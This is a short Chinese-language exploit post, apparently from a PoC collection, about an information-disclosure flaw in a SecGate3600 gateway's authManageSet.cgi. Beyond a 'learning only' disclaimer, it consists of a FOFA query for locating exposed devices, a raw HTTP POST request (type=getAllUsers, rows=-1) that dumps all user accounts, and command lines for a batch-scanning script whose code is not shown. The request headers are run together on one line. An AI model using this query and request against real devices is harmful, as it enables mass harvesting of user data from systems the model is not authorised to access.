# 某神SecGate3600 authManageSet.cgi信息泄露漏洞

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与作者无关。该文章仅供学习用途使用！！！

fofa语法

```
body="sec_gate_image/login_02.gif"fid="ldb0WVBlAgZloMw9AAge0A=="
```

POC:

```
POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1Host: your-ipContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Accept: */*Accept-Encoding: gzip, deflateConnection: close type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
```





批量poc(记得安装库)

python poc.py -u 



python poc.py -f  .txt

